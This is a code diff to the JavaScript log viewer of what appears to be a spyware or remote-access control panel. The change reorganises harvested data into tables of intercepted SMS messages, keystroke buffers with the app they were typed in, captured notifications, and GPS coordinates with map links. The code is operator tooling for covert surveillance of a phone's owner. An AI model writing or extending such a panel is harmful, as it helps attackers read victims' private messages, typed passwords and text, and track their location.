@@ -708,28 +708,69 @@ c.result_data.size_report || JSON['stringify'](c.result_data)}</div>` : ''}
 
         function renderLogs(rawText) {
             const lines = rawText.trim().split('\n');
-            return lines.map(line => {
+            const categories = {};
+            
+            // 1. Sort data into categories
+            lines.forEach(line => {
                 try {
                     const obj = JSON.parse(line);
-                    const date = new Date(obj.d?.ts || obj.ts || Date.now()).toLocaleTimeString();
                     const type = obj.t || "LOG";
-                    const details = obj.d || obj;
-                    
-                    let body = "";
-                    if (details.body) body = details.body;
-                    else if (details.txt) body = details.txt;
-                    else if (details.tree) body = "[UI_TREE_SNAPSHOT]";
-                    else body = JSON.stringify(details).substring(0, 100);
+                    const data = obj.d || obj;
+                    if (!categories[type]) categories[type] = [];
+                    categories[type].push(data);
+                } catch (e) {}
+            });
 
-                    return `
-                        <div class="viewer-card">
-                            <span class="viewer-ts">${date}</span>
-                            <span class="viewer-tag">${type}</span>
-                            <div style="margin-top:5px; font-size:0.8rem;">${body}</div>
-                            ${details.pkg ? `<div style="font-size:0.6rem; color:#555; margin-top:3px">Source: ${details.pkg}</div>` : ''}
-                        </div>`;
-                } catch (e) { return `<div class="viewer-card">${line}</div>`; }
-            }).join('');
+            if (Object.keys(categories).length === 0) return '<div style="text-align:center; padding:40px;">NO_PARSABLE_LOG_DATA</div>';
+
+            // 2. Render categorized tables
+            let html = "";
+            for (const [type, entries] of Object.entries(categories)) {
+                html += `<div style="margin-top:30px; margin-bottom:10px; display:flex; justify-content:space-between; align-items:center;">
+                            <h2 style="margin:0; font-size:0.8rem; background:var(--secondary)">${type}_STREAM</h2>
+                            <span style="font-size:0.6rem; color:var(--secondary)">${entries.length} ENTRIES</span>
+                         </div>`;
+                
+                html += `<div style="overflow-x:auto; background:rgba(0,0,0,0.2); border:1px solid #222; border-left:2px solid var(--secondary);">`;
+                html += `<table style="width:100%; border-collapse:collapse; font-size:0.75rem; text-align:left;">`;
+                
+                // Header mapping based on type
+                if (type === 'SMS') {
+                    html += `<tr style="background:rgba(255,255,255,0.03); color:var(--secondary)"><th style="padding:10px">SENDER</th><th style="padding:10px">MESSAGE</th><th style="padding:10px">TIME</th></tr>`;
+                    entries.forEach(e => {
+                        html += `<tr style="border-bottom:1px solid #111"><td style="padding:10px; color:var(--primary)">${e.sender || e.num}</td><td style="padding:10px">${e.body}</td><td style="padding:10px; color:#444; white-space:nowrap">${new Date(e.timestamp || e.ts).toLocaleTimeString()}</td></tr>`;
+                    });
+                } 
+                else if (type === 'KEY') {
+                    html += `<tr style="background:rgba(255,255,255,0.03); color:var(--secondary)"><th style="padding:10px">APP</th><th style="padding:10px">TEXT_BUFFER</th><th style="padding:10px">STATS</th></tr>`;
+                    entries.forEach(e => {
+                        html += `<tr style="border-bottom:1px solid #111"><td style="padding:10px; color:var(--primary)">${e.pkg}</td><td style="padding:10px">${e.txt}</td><td style="padding:10px; color:#444">${e.wpm || 0}WPM</td></tr>`;
+                    });
+                }
+                else if (type === 'NOTIF') {
+                    html += `<tr style="background:rgba(255,255,255,0.03); color:var(--secondary)"><th style="padding:10px">SOURCE</th><th style="padding:10px">CONTENT</th><th style="padding:10px">TIME</th></tr>`;
+                    entries.forEach(e => {
+                        html += `<tr style="border-bottom:1px solid #111"><td style="padding:10px; color:var(--primary)">${e.pkg}</td><td style="padding:10px"><div style="font-weight:bold">${e.title}</div>${e.txt}</td><td style="padding:10px; color:#444">${new Date(e.ts).toLocaleTimeString()}</td></tr>`;
+                    });
+                }
+                else if (type === 'LOC') {
+                    html += `<tr style="background:rgba(255,255,255,0.03); color:var(--secondary)"><th style="padding:10px">COORDINATES</th><th style="padding:10px">ACCURACY</th><th style="padding:10px">MAP_LINK</th></tr>`;
+                    entries.forEach(e => {
+                        const mapsLink = `https://www.google.com/maps?q=${e.lat},${e.lon}`;
+                        html += `<tr style="border-bottom:1px solid #111"><td style="padding:10px">${e.lat.toFixed(5)}, ${e.lon.toFixed(5)}</td><td style="padding:10px">±${e.acc}m</td><td style="padding:10px"><a href="${mapsLink}" target="_blank" style="color:var(--primary)">VIEW_MAP</a></td></tr>`;
+                    });
+                }
+                else {
+                    // Generic Fallback
+                    html += `<tr style="background:rgba(255,255,255,0.03); color:var(--secondary)"><th style="padding:10px">RAW_DATA</th></tr>`;
+                    entries.forEach(e => {
+                        html += `<tr style="border-bottom:1px solid #111"><td style="padding:10px; font-family:monospace; color:#888">${JSON.stringify(e)}</td></tr>`;
+                    });
+                }
+
+                html += `</table></div>`;
+            }
+            return html;
         }
 
         function formatBytes(bytes, decimals = 2) {
